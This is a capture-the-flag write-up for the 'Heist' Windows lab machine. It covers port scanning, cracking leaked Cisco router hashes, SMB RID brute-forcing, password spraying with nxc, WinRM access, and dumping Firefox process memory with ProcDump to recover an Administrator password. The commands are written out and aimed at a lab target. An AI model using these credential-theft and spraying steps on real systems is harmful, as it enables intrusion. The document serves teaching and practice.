+++
date = '2026-08-25T22:50:35+02:00'
draft = false
title = 'Heist Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`31/12/2025`**

![pwn.png](/images/imgs_heist/pwn.png)

---
# Introduction

**_Heist_** is an **Easy-level Windows** machine that highlights the dangers of leaking configuration files and poor password management.

The initial foothold involves enumerating a web application to discover a leaked **Cisco** router configuration containing **type 5** and **type 7** hashes. After successfully cracking these hashes, I leveraged **SMB RID Bruteforcing** to enumerate valid domain users and performed a **password spraying attack** to gain access.
The privilege escalation phase focuses on post-exploitation **memory analysis**, using **ProcDump** to extract plaintext credentials for the **Administrator** directly from a running web browser process.

---
# Techniques Used

- **Web Enumeration & Information Disclosure**

- **Password Cracking (Cisco Type 5 & Type 7)**

- **SMB RID Bruteforcing**

- **Password Spraying**

- **Process Memory Dumping**

# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- heist -Pn
```

```text
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49669/tcp open  unknown
```

Targeted scan with script and service detection:

```bash
nmap -sC -sV heist -Pn
```

```text
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-title: Support Login Page
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
445/tcp  open  microsoft-ds? syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 0s
```

## Web Enumeration

Browsing to port 80, I found a **Support Login Page** that allowed access as a "**Guest**" user. 

![web1.png](/images/imgs_heist/web1.png)

Inside the portal, I discovered a chat log between users **Hazard** and **Support Admin** discussing issues with a **Cisco** router.

![attach.png](/images/imgs_heist/attach.png)

Attached to the conversation was a configuration file leaking highly **sensitive information**, including user credentials and **Cisco hashes**:

![secrets.png](/images/imgs_heist/secrets.png)

# Initial Access

To proceed, I needed to crack the discovered hashes. For the **Cisco Type 5** hash, I used **John the Ripper**:

```bash
john type5 --wordlist=/usr/share/wordlists/rockyou.txt
```

![john.png](/images/imgs_heist/john.png)

For the **Type 7** hashes, I utilized a well-known online **Cisco Type 7 decrypter**:

- **https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html**

successfully recovering two additional passwords:

```text
0242114B0E143F015F5D1E161713 = Q4)sJu\Y8qz*A3?d

02375012182C1A1D751618034F36415408 = $uperP@ssword
```

![cisco1.png](/images/imgs_heist/cisco1.png)

![cisco2.png](/images/imgs_heist/cisco2.png)

Since the username **`hazard`** was explicitly mentioned in the web chat, I attempted to validate these credentials via **WinRM**, but the login failed. 
Checking **SMB** shares also yielded no interesting results.

Relying on standard methodology, I performed an **SMB RID Bruteforce** attack against the machine to enumerate valid users:

```bash
nxc smb heist -u hazard -p stealth1agent --rid-brute
```

![brute.png](/images/imgs_heist/brute.png)

After retrieving a solid user list, I saved it to **`users.txt`** and created a **`passwords.txt`** file containing the three cracked passwords. I then executed a **Password Spraying** attack:

```bash
nxc smb heist -u users.txt -p passwords.txt --continue-on-success
```

![spray1.png](/images/imgs_heist/spray1.png)

This successfully matched the user **`chase`** with the password **`Q4)sJu\Y8qz*A3?d`**. I validated the credentials against **WinRM** and secured my initial shell:

```bash
evil-winrm -i heist -u chase -p 'Q4)sJu\Y8qz*A3?d'
```

![winrm.png](/images/imgs_heist/winrm.png)

**User flag** in: **`C:\Users\Chase\Desktop\user.txt`**.

![userf.png](/images/imgs_heist/userf.png)

---
# Privilege Escalation

On **`Chase`**'s desktop, I found a **`todo.txt`** file with the following contents:

![todo.png](/images/imgs_heist/todo.png)

Since "**`checking the issues list`**" strongly implies interacting with a web application, I checked the running processes to see if a browser was active in the background:

```PowerShell
get-process firefox
```

![process.png](/images/imgs_heist/process.png)

The output confirmed multiple instances of **`firefox.exe`** running. Since web browsers often store sensitive data (like plaintext passwords from recent POST requests) in memory, I decided to dump the process.

I uploaded **ProcDump (Sysinternals)** to the target machine using the **Evil-WinRM** upload feature, and executed it against the **PID** with the highest memory footprint:

```PowerShell
.\procdump64.exe -ma 6996 -accepteula
```

![procdump.png](/images/imgs_heist/procdump.png)

![dump.png](/images/imgs_heist/dump.png)

After downloading the heavy dump file to my local machine, I inspected a login request previously captured via **Burp Suite**, noting that the password parameter was named **`login_password`**.

I searched the dump file for strings containing this specific parameter:

```bash
strings firefox.exe_251231_195159.dmp | grep login_password
```

![pass.png](/images/imgs_heist/pass.png)

This successfully extracted the plaintext password **`4dD!5}x/re8]FBuZ`** for the **`Administrator`** account. I validated the credentials and accessed the machine as **Administrator**:

```bash
evil-winrm -i heist -u Administrator -p '4dD!5}x/re8]FBuZ'
```

![rootf.png](/images/imgs_heist/rootf.png)

**Root flag** in: **`C:\Users\Administrator\Desktop\root.txt`**.

---
# Final Thoughts

I found this box very straightforward and definitively aligned with the **Easy** difficulty rating. Once you are familiar with the **ProcDump** attack vector and **memory analysis**, the escalation path is very linear. However, the requirement to pivot from web enumeration to hash cracking, followed by SMB  enumeration and memory forensics, provides a fantastic and realistic learning curve.

**Sources**:

- **Cisco Type 7 Password Decrypter: https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html**